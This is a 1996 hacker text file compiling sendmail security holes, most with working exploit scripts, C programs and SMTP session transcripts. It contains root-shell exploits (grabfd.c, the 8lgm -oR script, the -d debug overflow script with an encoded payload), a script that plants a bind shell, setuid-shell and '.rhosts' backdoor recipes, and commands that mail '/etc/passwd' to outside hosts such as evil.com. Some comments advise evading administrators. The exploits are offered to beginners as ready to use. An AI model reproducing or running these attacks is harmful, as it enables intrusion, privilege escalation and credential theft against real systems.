The Ultimate Sendmail Hole List                Data Collected by: Zhart
                                                   25/11/96  Italy  

I wanna say that I don't take any credit for this text, I simply collected
and reorganized all the info that was all around for my harddisk (and in my
head), just commented some bugs or added something; sometimes I haven't 
even tested the source codes. 
I started compiling this list for my own use, then I thought it would be 
interesting also for other ppl, mainly beginners, or maybe nobody.   
For any comments you can reach me on L.O.R.E. bbs
 
-----------------------------------------------------------------
  Hole                         Version of Sendmail
-----------------------------------------------------------------
= WIZ =                        *oLD*
= DEBUG =                      *oLD*
= TURN =                       *oLD*  
= OVERFLOW INPUT BUFFER =      *oLD*   
= DECODE ALIAS =               *VrFy*         
= qf SunOS =                   *SunOS-sendmailV5.1*
= -oR SunOS =                  *SunOS-sendmailV5.22*
= -oM =                        *8lgm6Dec1994-SMI-Sendmail(sm based on SunOS)*
= OVERWRITE FILES =            *FiXED iN 5.59*
= -oQ =                        *DuNNo*
= |PROGRAM =                   *TeSTeD oN 5.55*
= .forward =                   *5.61*
= TAIL =                       *TeSTeD oN 5.65*
= -C =                         *oLD* 
= 4.1 =                        *TeSTeD oN 4.1*      
= -d########### =              *8.X.X <8.6.7*
= -oE/filename bounce=         *8.6.7*
= 8.6.9 ident =                *8.6.9*
= 8.6.9 newlines =             *8.6.9*
= 8.6.10 ident/newlines =      *8.6.10*
= HP-UX =                      *HP-UX 9.x*
= 8.7.5 gecos =                *8.X.X <8.8.0* *TeSTed oN 8.6.12*
= mime7to8() =                 *8.8.0*
= smtpd =                      *8.7-8.8.2*
----------------------------------------------------------------


= WIZ =          *oLD*

   The oldest and easiest hole in sendmail is the 'wiz' backdoor, 
   now very difficult to find. At the connect just type 'wiz' and 
   then 'SHELL' ,and you're in a root shell.
   [ it can be set by configuring sendmail.cf file ... 'OW' option
     immediately followed by the encrypted password ]


= DEBUG =        *oLD*   

This bug was used by the inet worm by Robert T. Morris Jr. 
Its exploiting allows anyone to execute any program on a remote machine.
It simply consists in giving the 'debug' command, use a pipe to /bin/sh 
as recipient and feed the data with the commands you want to be executed
on the remote machine.

[ If sendmail server answers with "200 Debug set" to the 'debug' command
  there are good chances the bug is still present ]

Example :

#!/bin/sh
telnet << EOF
open fucked.host.edu 25
debug                  
mail from: </dev/null>  
rcpt to: <\"|sed -e '1,/^$/'d | /bin/sh ; exit 0\"> 
data

cp /bin/sh /tmp/sushi          # or alternatively: 
chmod 4755 /tmp/sushi          # echo "+ +" >> /.rhosts
. 
EOF



= TURN =                          *oLD*
    
   TURN command allows mail to be stolen ...
[ Don't bother, old stuff! ]

= OVERFLOW INPUT BUFFER =         *oLD*

   Cause the sendmail deamon to lock up ...
[ old stuff! Just for collection ;) ]

= DECODE ALIAS =                  *VrFy*
   
If '/etc/aliases' contains "|/usr/bin/uudecode" anyone can send mail to 
decode, write to any file onwed by daemon, if they can connect to sendmail 
daemon, can write to any file owned by any user.

To test the existence of decode alias from a sendmail connection do:

% telnet target.com
Trying 127.127.127.127
Connected to target.com
Escape character is '^]'.
220 target.com Sendmail Sendmail 5.55/victim ready at Fri, 6 Nov 93 18:00 PDT
expn decode
250 <"|/usr/bin/uudecode">
quit

/\/ 1SecExploit \/\:
% echo "myhost.com" | uuencode /usr/bin/.rhosts | mail decode@target.com

/\/ MoreThan1SecExploit \/\:

% cat > outfile                  # Let's make our .rhosts file
+ +
^C
% uuencode outfile /usr/bin/.rhosts
begin 644 /bin/.rhosts
$*R'K"O\

% telnet fuqdhost.com 25
220 fuqdhost.com SunOS Sendmail 8.6.1 #5 ready at Fri, 13 May 99 00:00 (EST)
VRFY decode
250 <|/usr/bin/uudecode>
MAIL FROM: bin
250 <bin> ... Sender Okay
RCPT TO: decode
250 <decode> ... Recipient Okay
DATA
354 Enter mail, end with "." on a line by itself
begin 644 /bin/.rhosts
$*R'K"O\                       # which is just "+ +" uuencoded

end
.
250 Mail accepted
quit
221 fuqdhost.com closing connection
Connection closed by foreign host.
% rlogin fuqdhost.com -l bin
$


If no home directories are known or writable, an interesting variation
of this is to create a bogus /etc/aliases.pag file that contains an
alias with a command you wish to execute on your target.  This may work
since on many systems the aliases.pag and aliases.dir files, which
control the system's mail aliases, are writable to the world.
 evil % cat decode
 bin: "| cat /etc/passwd | mail zen@evil.com"
 evil % newaliases -oQ/tmp -oA`pwd`/decode
 evil % uuencode decode.pag /etc/aliases.pag | mail decode@victim.com
 evil % /usr/lib/sendmail -fbin -om -oi bin@victim.com < /dev/null


= qf SunOS =                    = SunOS-sendmailV5.1 = 

The method used by sendmail version 5 to open a control file 
[/usr/spool/mqueue/qf########] is unsecure.  
A race condition exists whereby another process may obtain a control-file 
file descriptor, opened for write access.
Sendmail v5, during execution, sets umask(0), which is an insecure mask.  
In order not to leave open control files with mode 666, sendmail v5 uses 
chmod(2) to set a secure file mode.  
However this is a race condition, as we can obtain an open file descriptor
for write by opening the control file before the call to chmod(2).

IMPACT: Local users can write their own control files, and run programs
        as any user, bar root. 

EXPLOIT: 

grabfd.c:

/*
 * grabfd.c
 * usage: grabfd username command-file
 *
 *      username: user to execute 'command-file' as.
 *      command-file: file containing 10 lines of shell commands to execute.
 */

#include <stdio.h>
#include <unistd.h>
#include <sys/fcntl.h>
#include <sys/param.h>

#ifndef SENDMAIL
#define SENDMAIL "/usr/lib/sendmail"
#endif

#ifndef SPOOL_DIR
#define SPOOL_DIR "/usr/spool/mqueue"
#endif

char myqfile[] = "D%s\nC%s\nR|/usr/ucb/tail|/bin/sh\n";

main(argc,argv)
int argc;
char **argv;
{
        int pid, fd;
        char tbuf[MAXPATHLEN], sysbuf[BUFSIZ];

        if (argc != 3) {
                (void)fprintf(stderr, "%s: user file\n",
                        argv[0]);
                exit(1);
        }

        if (getpwnam(argv[1]) == NULL)
                (void)fprintf(stderr, "%s: user %s unknown (error 
ignored)\n",
                        argv[0],
                        argv[1]);

        if (access(argv[2], F_OK) == -1) {
                (void)fprintf(stderr, "%s: %s does not exist.\n",
                       argv[0],
                       argv[2]);
                exit(1);
        }

        if (access(SPOOL_DIR, X_OK) == -1) {
                (void)fprintf(stderr, "%s: cannot access %s.\n",
                        argv[0],
                        SPOOL_DIR);
                exit(1);
        }

        if (pid=fork()) {

                if (pid == -1) {
                        (void)perror("fork");
                        exit(1);
                }

                (void)sprintf(tbuf, "%s/tfAA%05d", SPOOL_DIR, pid);
                (void)sprintf(sysbuf, myqfile, argv[2], argv[1]);

                for (;;)
                        if ((fd=(open(tbuf, O_WRONLY, 0))) != -1) {
                                (void)printf("%s: grabbed queue fd.\n",
                                             argv[0]);
                                (void)wait();
                                (void)ftruncate(fd, 0);
                                (void)write(fd, sysbuf, strlen(sysbuf));
                                (void)close(fd);
                                if(execl(SENDMAIL,
                                      "sendmail", "-q", (char *)0) == -1) {
                                        (void)perror("execl");
                                        exit(1);
                                        };
                        }
        } else {
                (void)close(0);
                if (open("/etc/motd", O_RDONLY, 0) == -1) {
                        (void)perror("open");
                        exit(1);
                };

                if (execl(SENDMAIL,
                          "sendmail",
#ifdef sun
                          "-os",
#endif
                          "-odq", getlogin(), (char *)0) == -1) {
                        (void)perror("execl");
                        exit(1);
                };
        }
        exit(1);
}

::::::::::::::::::::::::::::::::: END OF HOLE ::::::::::::::::::::::::::::



= -oR SunOS =             *SunOS-4.1.X-sendmailV5.22*

From 8lgm:
----------

DESCRIPTION:   The -oR option uses popen() to return undeliverable mail.

IMPACT:        Local users can obtain root access.

-------------------------- ropt.sh ---------------------------------------

#!/bin/sh
#
# Syntax: roption host
#
# host is any system running sendmail (except localhost).
#
# This exploits a flaw in SunOS sendmail(8), and attempts
# create a suid root shell
#
# Written 1995 by [8LGM]
# Please do not use this script without permission.
#

PROG="`basename $0`"
PATH=/usr/ucb:/usr/bin:/bin      export PATH
IFS=" "                          export IFS

# Check args
if [ $# -ne 1 ]; then
        echo "Syntax: $PROG host"
        exit 1
fi

# Check we're on SunOS
if [ "x`uname -s`" != "xSunOS" ]; then
        echo "Sorry, this only works on SunOS"
        exit 1
fi

PROG="`basename $0`"

EXECME=/tmp/HotterThanMojaveInMyHeart

# Create EXECME.c

cat > $EXECME.c << 'EOF'
main(argc,argv)
int argc;
char *argv[];
{
        chown("/tmp/InfamousAngel", 0, 0);
        chmod("/tmp/InfamousAngel", 04755);
}
EOF

cc -o $EXECME $EXECME.c

# Check we have EXECME

if [ ! -x $EXECME ]; then
        echo "$PROG: couldnt compile $EXECME.c - check it out"
        exit 1
fi

/bin/cp /bin/sh /tmp/InfamousAngel
# Run sendmail

/usr/lib/sendmail -oR$1 -f";$EXECME;" -t << 'EOF'
To: No1InParticular

Hows it goin
EOF

exec /tmp/InfamousAngel

................................ Cut HeRe ...................................


= -oM =                   *8lgm6Dec1994-SMI-Sendmail(based on SunOS sm)*


Sun sendmail allows -oM to set any macro, and still retains
root privilege. ( The list of 'trusted' macros should be limited. )

At time of writing (Dec 1994) affected sendmail were:
" SunOS 4.x Sendmail - all versions including latest
                     4/5/94 Sendmail Jumbo Patch 100377-15 "

After further investigation, it has been discovered that SVR4 based
ports include sendmail(8) based on SMI code.

EXPLOIT:

        1. Create the file sunsendmailcp
8>------------------------- cut here ---------------------------
#!/bin/sh
#
# sunsendmailcp from to

if [ $# -ne 2 ]; then
        echo usage: `basename $0` from to
        exit 1
fi

rm -f /usr/tmp/dead.letter
if [ -f /usr/tmp/dead.letter ]; then
        echo sorry, cant continue - /usr/tmp/dead.letter exists
fi

if [ ! -r $1 ]; then
        echo $1 doesnt exist or is unreadable
        exit 1
fi

ln -s $2 /usr/tmp/dead.letter
/usr/lib/sendmail -L0 '-oM#anything' $USER < $1
rm /usr/tmp/dead.letter
exit 0
8>------------------------- cut here ---------------------------

        2. Execute the command
           % ./sunsendmailcp sourcefile targetfile
           and target file will either be appended to or created.

..................................         .................................


= OVERWRITE FILES =     *FiXED iN 5.59* 
   
Remote users are able to write to any *non-root* owned files in the system.
This bug was definitely fixed in version 5.59 from Berkeley;
despite the messages below, for versions of sendmail previous to 5.59,
the "evil.com" gets appended, despite the error messages, along
with all of the typical mail headers, to the file specified:

 % cat evil_sendmail
 telnet victim.com 25 << EOSM
 rcpt to: /home/zen/.rhosts
 mail from: zen
 data
 random garbage
 .
 rcpt to: /home/zen/.rhosts
 mail from: zen
 data
 evil.com
 .
 quit
 EOSM

 evil % /bin/sh evil_sendmail
 Trying 128.128.128.1
 Connected to victim.com
 Escape character is '^]'.
 Connection closed by foreign host.

 evil % rlogin victim.com -l zen
         Welcome to victim.com!
 victim %




= '-oQ' =                   *DuNNo*                                    
          

This bug involves the '-q' and the '-oQ' options and causes any file to be 
deleted and read.
You should create a 'qf'-type file, in the /usr/spool/mqueue dir, like this:
                                           
P28
T599831504
Dfilename
Suser
Ruser
H?P?return-path: <user>
H?F?from: user (User Name)
H?x?full-name: User Name
HTo: user
Hsubject: Gotcha

after the command `sendmail -q -oQ' is issued, file `filename'
will be deleted and its content will be mailed to 'user'.

- - - -
The 'oQ' sets the 'Q' option ,which selects the dir in which to queue messages
The 'q' make the daemon to process the queue
- - - -



= '|PROGRAM ' =     *TeSTeD oN 5.55* ...may be others

Anyone can specify arbitrary shell commands and/or pathnames for the 
sender and/or destination address.
A typical attack to get the password file is:


 % telnet target.com 25
 Trying 123.456.789.0...
 Connected to target.com
 Escape character is '^]'.
 220 target.com Sendmail 5.55 ready at Mon, 12 Dec 93 23:51
 mail from: "|/bin/mail me@myhost.com < /etc/passwd"
 250 "|/bin/mail me@myhost.com < /etc/passwd"... Sender ok
 rcpt to: mickeymouse
 550 mickeymouse... User unknown
 data
 354 Enter mail, end with "." on a line by itself
 .
 250 Mail accepted
 quit
 Connection closed by foreign host.
 %



= .forward =                *5.61*        

When delivering to files and programs, `sendmail' does not do an
`initgroups(3)' after forking on final delivery.  As a result, the sender's
group list remains in effect throughout this stage.  This is particularly
serious when root is sending the mail since a program executed out of a
`.forward' file gains interesting privileges like `wheel' and `kmem'.  A
related hole can be broken down into a "problem" and an "aggravation".  The
"problem" is that queued local mail no longer has the original recipient's
uid associated with it. Control files only store a list of exploded
recipients (i.e. users, files and programs) -- one per line -- each
prefaced with an `R'.  So, after an address resolves to the local machine
and has undergone alias and ".forward" expansion, if the letter happens to
get queued, on the succeeding queue run sendmail doesnt know who to run the
final delivery as.  The "aggravation" is that, when doing this final
delivery of queued local mail, sendmail will `setuid()' itself to
the sender's uid if it is available; in general, the sender's uid will be
used when the sender is on the local machine. As a result, a user can run a
program as anyone who sends them mail from the local machine.  There is
also an added "complication"; the default uid and gid are also set to the
sender when delivering mail!  Since the default uid and gid are only used
when calling `setuid()' and `setgid()' (to reset the uid/gid before doing
final delivery), these variables should never be set to the sender.


==========================   Local compromise   ==========================
Save the following program as "sploit.c" changing MYUID to your user id.
Compile "sploit.c" producing the executable "sploit" in your home
directory.  Create a ".forward" file containing:
     \<user>, "|<path>/sploit"
[change <user> to your username so you dont lose mail (unless, of
course, you'd rather lose mail) and set <path> to your home directory
path (where sploit lives)] Now, as another user, send yourself some
mail.  Note that the sploit program defers delivery the first time thru;
check out "/tmp/whoami" to see that sploit ran as you.  Now, run your
mail queue (or open a beer and wait for sendmail to run it). After the
queue run, note that the sploit accepted the letter and returned a
successful exit status; check out "/tmp/whoami" again to see that this
time, sploit ran as the sender! You can also use "sploit.c" to test for
the root initgroups() hole by checking the group list when "sploit" was
first called.

     #include <sys/param.h>
     #include <sys/types.h>
     #include <stdio.h>
     #include <sysexits.h>
     #include <pwd.h>
     #include <grp.h>

     #define MYUID 777 /* your uid (i.e. your ".forward" invokes this) */

     #definegetuser(uid)getpwuid(uid)->pw_name/* assume valid uid */
     #definegetgrp(gid)getgrgid(gid)->gr_name/* assume valid gid */

     main()
     {
     FILE *fp;
     uid_t myuid;
     int i, rval, ngrps, grplst[NGROUPS];

     if ((myuid = getuid()) == MYUID)
     rval = EX_TEMPFAIL;
     else
     rval = EX_OK;

     if ((fp = fopen("/tmp/whoami", "a")) != NULL) {

     /* real user/group ids */
     fprintf(fp, "%susr:%s grp:%s",
     (rval == EX_OK)? "": "Def> ",
     getuser(myuid), getgrp(getgid()));

     /* effective user/group ids */
     fprintf(fp, " eusr:%s egrp:%s",
     getuser(geteuid()), getgrp(getegid()));

     /* group list */
     if ((ngrps = getgroups(NGROUPS, grplst)) > 0) {
     fprintf(fp, " grps:");
     for (i = 0; i < ngrps; i++)
     fprintf(fp, " %s", getgrp(grplst[i]));
     }
     fprintf(fp, "\n");

     (void) fclose(fp);
     }

     exit(rval);
     }


--------------------- CuT HeRe -------------------------------------------------

=====================  trick for sendmail 5.61  ===========================
/*
 * 1) set the #define UID, at the top of the program to be your's
 * 2) create a file: /tmp/.shell, which is a script to make a suid shell
 * 3) compile the program and name it say, /tmp/.magic
 * 4) create a .forward file containing: '|/tmp/.magic'
 * 5) 'telnet yoursystem 25' and send yourself some fakemail from whoever
 *    you want a shell from (but not root :-( RATS!)
 * 6) wait abit, it usually works ...
 */

#define UID 777   /* change to your uid */

#include <sys/param.h>
#include <sys/types.h>
#include <stdio.h>
#include <sysexits.h>
#include <pwd.h>
#include <grp.h>

#define SHELLFILE  "/tmp/.shell"

main()
        int myuid, rval;

        if ((myuid = getuid()) == UID)
                rval = EX_TEMPFAIL;
        else {
                rval = EX_OK;
                system(SHELLFILE);
        }
        exit(rval);
}

------------------------------ CuT HeRe --------------------------------



= Tail creates a daemon shell =     *TeSTeD oN 5.65*

Through this sendmail bug, it is possible to become uid daemon (or
whatever your sendmail delivers non-user mail as), or the uid of any
user. The specifics are as follows:

*       The envelope From: field, or possibly the Errors-To: header (but
I've not tested it), must be set to the pipe through a bounce of your
mail will be returned. Typically this is executed by uid daemon.

*       An error must be caused in the message such that sendmail will send
a bounce to the From: envelope (or possibly to Errors-To:).

These two conditions are all that is necessary to exploit the bug. 
Typically the simplest thing to pipe to is

        |/usr/ucb/tail|/usr/bin/sh
aka     |/usr/ucb/tail|/bin/sh

That's for SunOS 4.1.3. Other systems may have tail in /usr/bin or
/bin/; the PATH is important in the case.

The condition we have used to generate an error is an invalid
Return-Receipt-To: header. There are a plethora of other ways to do
so, and some of them may depend on the specifics of your sendmail; be
forewarned.

The last ten lines of your message should contain whatever you wish to
do as uid daemon.


---cut here
[panix!jhawk] |% telnet panix.com 25
Trying 198.7.0.2 ...
Connected to panix.com.
Escape character is '^]'.
220 panix.com 5.65c/IDA-1.4.4 Sendmail is ready at Mon, 8 Nov 1993 19:41:13
-0500
HELO
250 Hello panix.com, why do you call yourself ?
MAIL FROM: |/usr/ucb/tail|/usr/bin/sh
250 |/usr/ucb/tail|/usr/bin/sh... Sender ok
RCPT TO: root
250 root... Recipient ok
DATA
354 Enter mail, end with @.@ on a line by itself
 From: jhawk"panix.com (John Hawkinson)
  To: jhawk"panix.com (John Hawkinson)
  Return-Receipt-To: |foobar
  Subject: This is a large hole in the ground.
  X-Disclaimer: We take no responsibility for what might happen


  Hi there. Wanna play ball?



  #!/bin/sh
  #The above line is just in case :-)
  echo This is a Serious Bug > /tmp/bug
  echo id reports: >> /tmp/bug
  /usr/bin/id >> /tmp/bug
  echo Fixing this would be good >> /tmp/bug
  cp /bin/sh /tmp/bugshell
  chmod u+s /tmp/bugshell
  echo /tmp/bugshell contains a setuid daemon shell >> /tmp/bug
  chmod ugo+rx /tmp/bugshell
.
250 Ok
quit
221 panix.com closing connection

------------------------- CuT HeRe ----------------------------------------



= "-C" =                     *oLD*     


Read any file.
Using the '-C' option causes an alternative configuration file to be used,
if the file is a protected file which is actually not a send mail 
configuration file, `sendmail' will print out some contents of the file 
as an error message.

It is reported working on DYNIX (3.0.14)  and  ULTRIX (2.X) 

$ sendmail -C /etc/shadow
<contents of /etc/shadow>
 




= 4.1 =                  *TeSTeD oN 4.1*


It allows remote access as bin...and since bin owns the /etc dir you
can gain root.

Rsend needs mconnect, which is a binary, which just connects to the place
and sends the data.  You can get rid the of ()'s at the beginninga and end
of the script, and get rid of the mconnect line, and run like ./rsend >
file, then ascii U/L the file to port 25...If it says a lot of stuff like
"Command Ununown" 25 times, then it didn't work.

Here's rsend:

#!/bin/sh
# Copyright, 1992, 1993 by Scott Chasin (chasin@crimelab.com)
#
# This material is copyrighted by Scott Chasin, 1992, 1993. The
# usual standard disclaimer applies, especially the fact that the
# author is not liable for any damages caused by direct or indirect
# use of the information or functionality provided by this program.
#
# Description:
#
# Exploit NEW sendmail hole  and bind a port so we can spawn a program.
# Not for distribution under any circumstances
#
# Usage: smail <hostname> <target-user-name> <target-port> <shell command>
# default: smail <localhost> <daemon> <7001> </bin/sh>

port=$3
user=$2
cmd=$4

if [ -z "$2" ]; then
   user=daemon
fi

if [ -z "$3" ]; then
   port=7002
fi

if [ -z "$4" ]; then
   cmd="/bin/csh -i"
fi

(
sleep 4
echo "helo"
echo "mail from: |"
echo "rcpt to: bounce"
echo "data"
echo "."
sleep 3
echo "mail from: $user"
echo "rcpt to: | sed '1,/^$/d' | sh"
echo "data"
echo "cat > /tmp/a.c <<EOF"
cat <<  EOF
#include <sys/types.h>
#include <sys/signal.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
reap(){int s;while(wait(&s)!=-1);}main(ac,av)int ac;
int **av;{struct sockaddr_in mya;struct servent *sp
;fd_set muf;int myfd,new,x,maxfd=getdtablesize();
signal(SIGCLD,reap);if((myfd=socket(AF_INET,SOCK_STREAM,
0))<0)exit(1);mya.sin_family=AF_INET;bzero(&mya.sin_addr,
sizeof(mya.sin_addr));if((sp=getservbyname(av[1],"tcp"))
==(struct servent *)0){if(atoi(av[1])<=0)exit(1);mya.sin_port
=htons(atoi(av[1]));}else mya.sin_port=sp->s_port;if(bind(myfd,
(struct sockaddr *)&mya,sizeof(mya)))exit(1);if(listen(myfd,
1)<0)exit(1);loop: FD_ZERO(&muf);FD_SET(myfd,&muf);if
(select(myfd+1,&muf,0,0,0)!=1||!FD_ISSET(myfd,&muf))goto
loop;if((new=accept(myfd,0,0))<0)goto loop;if(fork()
==0){for(x=2;x<maxfd;x++)if(x!=new)close(x);for(x=0;x<
NSIG;x++)signal(x,SIG_DFL);dup2(new,0);close(new);dup2
(0,1);dup2(0,2);execv(av[2],av+2);exit(1);}close(new);
goto loop;}
EOF
echo "EOF"
echo "cd /tmp"
echo "/bin/cc /tmp/a.c"
echo "/bin/rm a.c"
echo "/tmp/a.out $port $cmd"
echo "."
echo "quit"
) | mconnect $1

Or you can also ul this to port 25.
BTW, it gets you in by running a program that listens to port 7008...
you telnet to port 7008. You can then proceed to create new users in
/etc/passwd because you own the /etc dir...you need to type a ; after every
command, and it gives you 1 error every command...ignore it. The process
may be noticed by a few admins.

helo
mail from: |
rcpt to: bounce
data
.
mail from: bin
rcpt to: | sed '1,/^$/d' | sh
data
cat > /tmp/a.c <<EOF
#include <sys/types.h>
#include <sys/signal.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
reap(){int s;while(wait(&s)!=-1);}main(ac,av)int ac;
int **av;{struct sockaddr_in mya;struct servent *sp
;fd_set muf;int myfd,new,x,maxfd=getdtablesize();
signal(SIGCLD,reap);if((myfd=socket(AF_INET,SOCK_STREAM,
0))<0)exit(1);mya.sin_family=AF_INET;bzero(&mya.sin_addr,
sizeof(mya.sin_addr));if((sp=getservbyname(av[1],"tcp"))
==(struct servent *)0){if(atoi(av[1])<=0)exit(1);mya.sin_port
=htons(atoi(av[1]));}else mya.sin_port=sp->s_port;if(bind(myfd,
(struct sockaddr *)&mya,sizeof(mya)))exit(1);if(listen(myfd,
1)<0)exit(1);loop: FD_ZERO(&muf);FD_SET(myfd,&muf);if
(select(myfd+1,&muf,0,0,0)!=1||!FD_ISSET(myfd,&muf))goto
loop;if((new=accept(myfd,0,0))<0)goto loop;if(fork()
==0){for(x=2;x<maxfd;x++)if(x!=new)close(x);for(x=0;x<
NSIG;x++)signal(x,SIG_DFL);dup2(new,0);close(new);dup2
(0,1);dup2(0,2);execv(av[2],av+2);exit(1);}close(new);
goto loop;}
EOF
cd /tmp
/bin/cc /tmp/a.c
/bin/rm a.c
/tmp/a.out 7008 /bin/sh
.
quit


............................... CuT HeRe ..................................


= -d########### =     *TeSTeD oN SunOS & SunOS with Sendmail8.6.4*  

This bug is present in all 8.X.X sendmail versions prior to 8.6.7
Here follow excerpts from Michael Widner's message on Bugtraq with 
his script for SunOs and Solaris, and another script tested on SunOS 5.2
with sendmail 8.6.4:

"The important thing to know is that if your sendmail crashes when you 
pass it something like -d387654321 then it can most likely be exploited to 
gain root access.

Without going into much detail, -dx.y writes y into the debug array as
array[x]=y.  Range checking is not performed properly on x, so it's possible
to pass negative integers that pass the range check.  Find a key location
before the debug array, over write it, and you're in business.

The problem in trying to create a generic script is that the 'key' locations
have different offsets from the debug array for every version of sendmail.
Sometimes they're easy to locate if you can get a core, but sometimes it is
tough to get a core w/o already being root.  Also, sometimes a core tells
you nothing.

The following script is Sun specific, and patches are now available for
all versions of Sun sendmail.  The script creates a suid root owned copy
of /bin/sh and places it in /tmp.  If you're hacking solaris, I'd suggest
you choose some program other than /bin/sh. "

#!/bin/sh
# This script takes advantage of sendmail's (mis)interpretation of
# very large unsigned ints as signed ints when accessing the debug
# array.  As it, it will work with the 8 versions of sun sendmail
# that I have access to.  Perhaps I'll update it if I find new
# versions of sun sendmail.
# NOTE:  This is a Sun specific script.  Don't expect it to work with
#        any non-sun sendmail.
# -Michael R. Widner (atreus)        3/25/94
#
# usage:  smdhole [/path/to/suid/sendmail]
#

# add /usr/ucb to path so solaris can find `whoami` (4/18/94)
path=$path:/usr/ucb

if [ $1x = x ]; then
        sendmail=/usr/lib/sendmail
else
        echo "Trying to abuse $1."
        sendmail=$1
fi

sm_size=`echo \`ls -l $sendmail\` | cut -d" " -f4,5 | sed "s/[^0-9]//g`

# prefix and suffix for -1 as unsigned integer.  Actually, this is
# off by two.  you figure out why.
prefix=42949
suffix=67297

case $sm_size in
        132064)
                n1=${prefix}52864
                n2=${prefix}52865
                n3=${prefix}52866
                echo Patched solaris w/o mx.
                ;;
        134752) # ug! dropped a 0 before.  fixed 4/18/94
                n1=${prefix}01656
                n2=${prefix}01657
                n3=${prefix}01658
                echo Patched solaris sendmail.mx
                ;;
        130860)
                n1=${prefix}53016
                n2=${prefix}53017
                n3=${prefix}53018
                echo Un-patched solaris w/o mx.
                ;;
        133548) # ug! dropped a 0 before.  fixed 4/18/94
                n1=${prefix}01808
                n2=${prefix}01809
                n3=${prefix}01810
                echo Un-patched solaris sendmail.mx
                ;;
        139264)
                n1=${prefix}49609
                n2=${prefix}49610
                n3=${prefix}49611
                echo Sun 4.1.3 sendmail - could be either of two versions
                n4=${prefix}49265
                n5=${prefix}49266
                n6=${prefix}49267
                ;;
        155648)
                n1=${prefix}46953
                n2=${prefix}46954
                n3=${prefix}46955
                echo Sun 4.1.3 sendmail.mx - could be either of two versions
                n4=${prefix}46609
                n5=${prefix}46610
                n6=${prefix}46611
                ;;
        *)
                echo "I don't know what version of sendmail $sendmail is."
                echo -n "Look for other versions of sendmail[.mx] on the "
                echo "system and re-run this as:"
                echo "     $0 /path/to/another/suid/sendmail"
                echo
                echo "Let me see if I can suggest anything..."
                find /usr/lib /var/sadm/patch -name "*sendm*" -perm -4001 
-ls 2>/dev/null
                exit 1
                ;;
        esac

cat << EOM > /tmp/sendmail.cf
DMether
DRlocalhost
CRlocalhost
CDMailer-Daemon root daemon uucp
DlFrom \$g  \$d
Do.:%@!^=/[]
Dq\$g\$?x (\$x)\$.
De\$j nothing
OA./aliases
OF0666
Og1
OL0
Oo
OPPostmaster
OQ.
Os
Ou1
T root daemon uucp

H?F?From: nobody

Mlocal, P=/tmp/in.telnet, F=flsSDFMmnP, S=10, R=20, A=mail -d \$u
Mprog,  P=/tmp/in.telnet,   F=lsDFMeuP,  S=10, R=20, A=sh -c \$u

S0
R\$+                    \$#local \$:\$1                 just rewrite
EOM

cat $0 | sed "s:atreus::" | uudecode
uncompress /tmp/in.telnet.Z
chmod 755 /tmp/in.telnet

mkdir /tmp/mail
cp /tmp/sendmail.cf /tmp/mail

cp /bin/sh /tmp/newsh
chmod 666 /tmp/newsh

$sendmail -d${n1}.116,${n2}.109,${n3}.112 `whoami`  <<EOF

test
EOF

if [ -x /tmp/newsh ]; then
        echo "Had the right offset for sendmail.cf.  Here's the result:"
else
        echo "Looks like I had the wrong sendmail.cf offset.  Fuckers."
        if [ ${n4}x = x ]; then
                echo "This version isn't what I thought it was."
                echo "Look for other suid sendmails and try this on them."
        else
                echo "I'm taking another stab with a different offset."
$sendmail -d${n4}.116,${n5}.109,${n6}.112 `whoami` <<EOF

test
EOF
                echo "Here's the result:"
        fi
fi

rm /tmp/in.telnet
rm -r /tmp/mail
rm /tmp/sendmail.cf
ls -l /tmp/newsh

exit

# I'm calling this in.telnet for one reason.  It shows up in the acct logs
# as being run by root.  It will attract less attention if it's something
# normally run by root.  An alert admin will catch is anyway, because
# in.telnet is normally not associated with a tty.  The obvious fix, if you
# want to go undetected, would be to modify the acct files once you've
# become root.
begin 775 /tmp/in.telnet.Z
M'YV0@08$6    (B"!A$J5 CBX,*"O" <A#8 %!!)%8E44@%" "4!H A\!*+@atreus
M0D$(U$2  S:@( )A ,0@  0)0  !@  0"( 02$$%/ OZ1+"S9T%'G$:  C%4atreus
MH%&B00%T&O<+S0N7KBJ(0Q'!)20)(ACX!+!$DD0 K"  0( 1%)>Q2RA)! %(atreus
M5$,).9]$%38!E!= H,(LP$LV*KJ*8(15)".N(AI2!6Q*(@ HPM6U6<4A@716atreus
M+H@"%QQ:D@!. ":U%L;2T'36E%H$D 0 H"!ML><#H0N.!B?A-(#4!5>PGGT9atreus
M068Z7==^%;%A[ BS!U6]5@P*#4V;. $L*)YY,P%@$LP"B' [-X#=O=56&'N!atreus
M]4'J<$(""V!.*1]U2@&Q4TJHY5J8,@FC%"+^00 3&, (" HC_B$@" 1@D*$@atreus
M))R!$, GQ!0$'1^!' ,. H&@<U).!CSX&00Y$6#B$2@"((") T0"S4$*I!A5atreus
M(,-\&%6% DA2 #@$4%, , "82(",!U7XAXD!(&G4"W7,(<<+;*0A!I5DN##'atreus
M&P"\0$89=KR@1QER</E0!F/(00<,.H#@QAL@0"DEE59BJ>4;"CP$@ EIKMFFatreus
MG%-6>24;66X)0AMAP %'&FZ< 8(98:3!1AURE)'G0A3TR::;<'H)IIADXKG0atreus
M"W2T <<+;I1QQQQH%#35+Y",%40(+OET@!X5 @ )!2)  AT MN;AF:Z\Q@K atreus
M 7F8E4([MJZ1:X<?AOC0JY DAY( ((!3UR__$-: )!)D"XT 8%!FEXLY)3"Latreus
M)>02\*LD[8X+Q )U'20!M_U\!$H DDB24W8*6"M*N."$H@(8 D!#P'B?P&03atreus
M0J 0\@,_,N"K\'C0@BBB5%15>Y(TV')3%QCH I  *.%R<S$ #1<4$@@$K%POatreus
M /?^LT]4R<$&%CBV(O%KQM)R#.L$)XT+!C,S$T9 A0'\\<\_YT CPM% ;_P0atreus
M$&P41( E3_^3(;!X%)0 UT_3(A0A!15 ]C^L"%43  VLO3$0G!2TP-K8"(7*atreus
M3VLS(Y39 #BP-A,(^0>  0BI51#1!36 $ 4(1>7X0Y$5)%M!!R"TL$L(50[ atreus
MI8<CE !"F1?D $((($20V @Q@!#HBFN'T .M(Y1<X'K2_M#M$B#4^T.,8ZHGatreus
M )$=P$A!)R!!>N8&A"-4WJ:/7H#?P%H]060%G&Z00P!DP-, 8NA9 D\&B*,Gatreus
M"Y$-X$=!(M1=D R9%R"'4$06M$/F!^0@E$)%? ^*GDO@R0% IQ I") %>LI"atreus
M9 A@BH*,@!0("0-/B**G-)"/#GJ20^9,(Q1H((00HSM ')Z'D$F,3@#3$ HXatreus
